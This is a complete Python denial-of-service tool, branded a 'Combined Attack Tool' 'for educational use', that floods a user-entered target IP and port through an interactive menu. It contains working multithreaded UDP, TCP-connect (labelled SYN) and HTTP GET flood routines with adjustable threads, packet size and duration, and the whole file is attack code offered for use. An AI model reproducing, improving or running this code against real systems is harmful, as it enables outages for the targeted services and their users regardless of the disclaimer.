import os
import sys
import socket
import random
import time
from datetime import datetime
from termcolor import colored
from threading import Thread

# Banner
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, "red"))
    print(colored("*******************************************", "yellow"))
    print(colored("*            Combined Attack Tool         *", "yellow"))
    print(colored("*         Created for Educational Use     *", "yellow"))
    print(colored("*******************************************", "yellow"))
    print(colored("Author: Educational Example", "green"))
    print(colored("Usage of this tool must comply with all laws.", "blue"))
    print()

# UDP Flood Attack
def udp_flood(ip, port, duration, threads, bytes_to_send):
    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(bytes_to_send)
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                sock.sendto(payload, (ip, port))
            except KeyboardInterrupt:
                break

    for _ in range(threads):
        Thread(target=attack).start()

    print(colored("\nUDP Flood attack completed.", "green"))

# SYN Flood Attack
def syn_flood(ip, port, duration, threads):
    def attack():
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.close()
            except socket.error:
                pass
            except KeyboardInterrupt:
                break

    for _ in range(threads):
        Thread(target=attack).start()

    print(colored("\nSYN Flood attack completed.", "green"))

# HTTP Flood Attack
def http_flood(ip, port, duration, threads):
    def attack():
        timeout = time.time() + duration
        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()

        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.sendall(request)
                sock.close()
            except socket.error:
                pass
            except KeyboardInterrupt:
                break

    for _ in range(threads):
        Thread(target=attack).start()

    print(colored("\nHTTP Flood attack completed.", "green"))

# Restart Tool
def restart_tool():
    print(colored("\nRestarting tool...", "cyan"))
    time.sleep(2)
    os.execv(sys.executable, ['python'] + sys.argv)

# Main Function
def main():
    while True:
        show_banner()
        print("1. Start basic attack mode")
        print("2. Start enhanced attack mode")
        print("3. View attack logs")
        print("4. Restart tool")
        print("5. Exit")
        
        choice = input(colored("Select an option: ", "cyan"))

        if choice == "1":
            basic_mode()
        elif choice == "2":
            enhanced_mode()
        elif choice == "3":
            view_logs()
        elif choice == "4":
            restart_tool()
        elif choice == "5":
            print(colored("Exiting... Goodbye!", "red"))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", "red"))

def basic_mode():
    ip, port, duration, attack_type = get_user_input()
    if attack_type == "1":
        udp_flood(ip, port, duration, threads=1, bytes_to_send=65535)
    elif attack_type == "2":
        syn_flood(ip, port, duration, threads=1)
    elif attack_type == "3":
        http_flood(ip, port, duration, threads=1)
    else:
        print(colored("Invalid choice. Exiting...", "red"))
        sys.exit()

def enhanced_mode():
    ip, port, duration, attack_type = get_user_input()
    try:
        threads = int(input(colored("Enter number of threads (Max: 100): ", "cyan")))
        bytes_to_send = int(input(colored("Enter bytes per packet (Max: 65535): ", "cyan")))

        threads = min(threads, 100)
        bytes_to_send = min(bytes_to_send, 65535)
    except ValueError:
        print(colored("Invalid input. Exiting...", "red"))
        sys.exit()

    if attack_type == "1":
        udp_flood(ip, port, duration, threads, bytes_to_send)
    elif attack_type == "2":
        syn_flood(ip, port, duration, threads)
    elif attack_type == "3":
        http_flood(ip, port, duration, threads)
    else:
        print(colored("Invalid choice. Exiting...", "red"))
        sys.exit()

def view_logs():
    print(colored("\nNo logs available yet. This feature is under development.", "yellow"))

def get_user_input():
    ip = input(colored("Enter target IP: ", "cyan"))
    try:
        port = int(input(colored("Enter target port: ", "cyan")))
        duration = int(input(colored("Enter attack duration (seconds): ", "cyan")))
    except ValueError:
        print(colored("Invalid input. Exiting...", "red"))
        sys.exit()

    print("\nSelect attack type:")
    print("1. UDP Flood")
    print("2. SYN Flood")
    print("3. HTTP Flood")
    attack_type = input(colored("Enter choice (1/2/3): ", "cyan"))

    return ip, port, duration, attack_type

if __name__ == "__main__":
    main()
